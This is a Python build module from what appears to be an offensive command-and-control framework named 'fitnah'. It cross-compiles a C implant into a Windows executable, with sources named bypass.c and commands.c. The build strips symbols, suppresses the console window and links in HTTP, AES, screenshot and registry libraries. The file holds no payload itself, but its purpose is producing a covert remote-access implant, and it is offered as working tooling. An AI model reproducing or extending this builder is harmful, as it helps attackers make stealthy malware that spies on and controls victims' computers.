"""
Builder compiler — cross-compile the C implant to a Windows PE using mingw-w64.

On Linux  : requires x86_64-w64-mingw32-gcc in PATH
On Windows : uses msys2 bash (C:\\msys64\\usr\\bin\\bash.exe) with ucrt64/mingw64 toolchain
"""
from __future__ import annotations

import os
import shutil
import subprocess
import sys
from pathlib import Path

from fitnah.builder.models import Arch, BuildResult


_IMPLANT_DIR = Path("implant")
_IMPLANT_SRC = _IMPLANT_DIR / "fitnah_implant.c"

_ALL_SRCS = [
    _IMPLANT_DIR / "fitnah_implant.c",
    _IMPLANT_DIR / "src" / "utils.c",
    _IMPLANT_DIR / "src" / "http.c",
    _IMPLANT_DIR / "src" / "crypto.c",
    _IMPLANT_DIR / "src" / "bypass.c",
    _IMPLANT_DIR / "src" / "commands.c",
]

_CROSS_GCC = {
    Arch.X64: "x86_64-w64-mingw32-gcc",
    Arch.X86: "i686-w64-mingw32-gcc",
}

# Windows msys2 installations — checked in order
_MSYS2_BASH_PATHS = [
    r"C:\msys64\usr\bin\bash.exe",
    r"C:\msys2\usr\bin\bash.exe",
    r"C:\tools\msys64\usr\bin\bash.exe",
    r"C:\ProgramData\chocolatey\lib\msys2\tools\msys64\usr\bin\bash.exe",
]

# Extra Windows gcc search paths (mingw-w64 standalone installs)
_WIN_GCC_PATHS = {
    Arch.X64: [
        r"C:\mingw64\bin\x86_64-w64-mingw32-gcc.exe",
        r"C:\mingw-w64\x86_64-8.1.0-posix-seh-rt_v6-rev0\mingw64\bin\gcc.exe",
        r"C:\tools\mingw64\bin\x86_64-w64-mingw32-gcc.exe",
        r"C:\ProgramData\chocolatey\lib\mingw\tools\install\mingw64\bin\x86_64-w64-mingw32-gcc.exe",
    ],
    Arch.X86: [
        r"C:\mingw32\bin\i686-w64-mingw32-gcc.exe",
        r"C:\tools\mingw32\bin\i686-w64-mingw32-gcc.exe",
    ],
}

# PATH additions inside msys2 bash for the compiler
_MSYS2_GCC_PATH = {
    Arch.X64: "/ucrt64/bin:/mingw64/bin",
    Arch.X86: "/mingw32/bin",
}

# Linux fallback search paths
_LINUX_SEARCH_PATHS = [
    "/usr/bin",
    "/usr/local/bin",
]

_CC_FLAGS = [
    "-O2",
    "-s",           # strip symbols
    "-mwindows",    # no console window
    "-static",      # static libgcc
    "-Iimplant/src",
]

_LD_FLAGS = [
    "-lwininet",    # HTTP
    "-lbcrypt",     # AES
    "-lntdll",
    "-lgdi32",      # GDI (screenshot)
    "-luser32",
    "-ladvapi32",   # registry
]


def _find_msys2_bash() -> str | None:
    for p in _MSYS2_BASH_PATHS:
        if Path(p).exists():
            return p
    return shutil.which("bash")  # WSL bash or Git bash on PATH


def _find_gcc_windows(arch: Arch) -> str | None:
    """Find a native mingw-w64 GCC on Windows without needing MSYS2 bash."""
    # Try cross-compiler name via PATH first
    found = shutil.which(_CROSS_GCC[arch])
    if found:
        return found
    # Try known standalone install locations
    for p in _WIN_GCC_PATHS.get(arch, []):
        if Path(p).exists():
            return p
    return None


def _find_gcc_linux(arch: Arch) -> str | None:
    name = _CROSS_GCC[arch]
    return shutil.which(name)


def _to_posix(path: str | Path) -> str:
    """Convert Windows path to msys2-style POSIX path."""
    p = str(path).replace("\\", "/")
    if len(p) >= 2 and p[1] == ":":
        drive = p[0].lower()
        p = f"/{drive}{p[2:]}"
    return p


def compile_implant(
    out_path: Path,
    arch: Arch,
    defines: dict[str, str],
    implant_src: Path | None = None,
    extra_flags: list[str] | None = None,
) -> BuildResult:
    main_src = implant_src or _IMPLANT_SRC
    if not main_src.exists():
        return BuildResult(
            ok=False,
            error=f"Implant source not found: {main_src}",
        )

    srcs = [str(s) for s in _ALL_SRCS if s.exists()] or [str(main_src)]
    define_flags = [f"-D{k}={_shell_quote(v)}" for k, v in defines.items()]

    if sys.platform == "win32":
        return _compile_windows(out_path, arch, srcs, define_flags, extra_flags or [])
    else:
        return _compile_linux(out_path, arch, srcs, define_flags, extra_flags or [])


def _compile_linux(
    out_path: Path, arch: Arch,
    srcs: list[str], define_flags: list[str], extra_flags: list[str],
) -> BuildResult:
    gcc = _find_gcc_linux(arch)
    if not gcc:
        return BuildResult(
            ok=False,
            error=f"{_CROSS_GCC[arch]} not found — install with: sudo apt install mingw-w64",
        )
    cmd = [gcc] + srcs + _CC_FLAGS + _LD_FLAGS + extra_flags + define_flags + ["-o", str(out_path)]
    log = [f"CMD: {' '.join(cmd)}"]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        log += proc.stdout.splitlines() + proc.stderr.splitlines()
        if proc.returncode != 0:
            return BuildResult(ok=False, error=proc.stderr.strip() or "Compile failed", build_log=log)
        return BuildResult(ok=True, path=out_path, build_log=log)
    except subprocess.TimeoutExpired:
        return BuildResult(ok=False, error="Compiler timed out", build_log=log)
    except Exception as exc:
        return BuildResult(ok=False, error=str(exc), build_log=log)


def _compile_windows(
    out_path: Path, arch: Arch,
    srcs: list[str], define_flags: list[str], extra_flags: list[str],
) -> BuildResult:
    # Try native GCC first — no MSYS2 shell needed
    native_gcc = _find_gcc_windows(arch)
    if native_gcc:
        cmd = [native_gcc] + srcs + _CC_FLAGS + _LD_FLAGS + extra_flags + define_flags + ["-o", str(out_path)]
        log = [f"CMD (native): {' '.join(cmd[:6])}..."]
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            log += proc.stdout.splitlines() + proc.stderr.splitlines()
            if proc.returncode == 0 and out_path.exists():
                return BuildResult(ok=True, path=out_path, build_log=log)
            # fall through to MSYS2 if native gcc fails
        except Exception:
            pass

    bash = _find_msys2_bash()
    if not bash:
        return BuildResult(
            ok=False,
            error=(
                "No mingw-w64 compiler found. Options:\n"
                "  1. Install MSYS2 from https://msys2.org then: pacman -S mingw-w64-x86_64-gcc\n"
                "  2. Install standalone mingw-w64 from https://winlibs.com\n"
                "  3. Add x86_64-w64-mingw32-gcc to PATH"
            )
        )

    gcc_name = _CROSS_GCC[arch]
    extra_path = _MSYS2_GCC_PATH[arch]

    # Convert all paths to POSIX for bash
    posix_srcs   = " ".join(_to_posix(s) for s in srcs)
    posix_out    = _to_posix(out_path)
    flags_str    = " ".join(_CC_FLAGS + _LD_FLAGS + extra_flags + define_flags)

    bash_cmd = (
        f"PATH={extra_path}:$PATH "
        f"{gcc_name} {posix_srcs} {flags_str} -o {posix_out} 2>&1; echo __EXIT__:$?"
    )

    log = [f"BASH: {bash_cmd[:200]}"]
    try:
        proc = subprocess.run(
            [bash, "-c", bash_cmd],
            capture_output=True, text=True, timeout=120,
        )
        combined = (proc.stdout or "") + (proc.stderr or "")
        log += combined.splitlines()

        # extract exit code from our marker
        exit_code = proc.returncode
        for line in combined.splitlines():
            if line.startswith("__EXIT__:"):
                try:
                    exit_code = int(line.split(":")[1])
                except ValueError:
                    pass

        if exit_code != 0:
            error = "\n".join(l for l in combined.splitlines() if "__EXIT__" not in l) or "Compile failed"
            return BuildResult(ok=False, error=error.strip(), build_log=log)
        if not out_path.exists():
            return BuildResult(ok=False, error="Compiler succeeded but output not found", build_log=log)
        return BuildResult(ok=True, path=out_path, build_log=log)
    except subprocess.TimeoutExpired:
        return BuildResult(ok=False, error="Compiler timed out", build_log=log)
    except Exception as exc:
        return BuildResult(ok=False, error=str(exc), build_log=log)


def _shell_quote(val: str) -> str:
    """Quote a define value — wrap strings with embedded spaces in escaped quotes."""
    if " " in val or '"' in val or "'" in val:
        escaped = val.replace('"', '\\"')
        return f'\\"{escaped}\\"'
    return val
